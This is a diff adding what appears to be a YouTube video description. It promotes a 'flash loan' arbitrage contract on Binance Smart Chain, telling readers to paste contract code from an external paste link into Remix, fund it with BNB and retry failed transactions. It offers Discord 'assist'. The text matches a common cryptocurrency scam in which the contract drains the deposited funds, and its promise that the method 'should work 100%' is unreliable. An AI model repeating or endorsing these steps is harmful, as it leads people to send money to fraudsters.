@@ -1,0 +1,23 @@
+tutorail: https://www.youtube.com/watch?v=2hRQ2prGxB8
+
+BRAND NEW FLASH LOAN CONTRACT CODE : Working as of January 28, 2022 
+NEW GAS FEE REQUIRED: 0.55BNB 
+REMOVED AUTO LOAN FUNCTION 
+
+In this video, you can see how I used Flashloans to Arbitrage in Binance Smartchain BSC. We deploy our own contract on BSC to swap between PancakeSwap and Bakeryswap. We keep profits in BNB and this can be repeated at times. Higher the volatility, higher profit due to price change. 
+
+
+Flash Loan Contract Code: https://ghostbin.com/QmhwS/raw
+
+Remix Contract IDE: https://remix.ethereum.org/
+
+How to add the BSC network to Metamask: https://academy.binance.com/en/articl...
+
+For assist, DM me on Discord: boredprimate#4101
+
+Flash Loans explanation: https://academy.binance.com/en/articl...
+
+STEPS: Before starting, install and setup MetaMask in Chrome Browser. You need to have BNB in your Metamask Wallet, using the BEP20(BSC) Network, not BEP2! Follow this instruction on connecting MetaMask to Binance Smart Chain - https://academy.binance.com/en/articl...
+
+Note: The arbitrage might fail due to depletion of BNB in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) and retry the transaction this time preferably with 825 loan amount and 31,560 gas limit and it should work 100% but with a smaller profit. Make sure to transfer your BNB out to another wallet when you're done.
+.
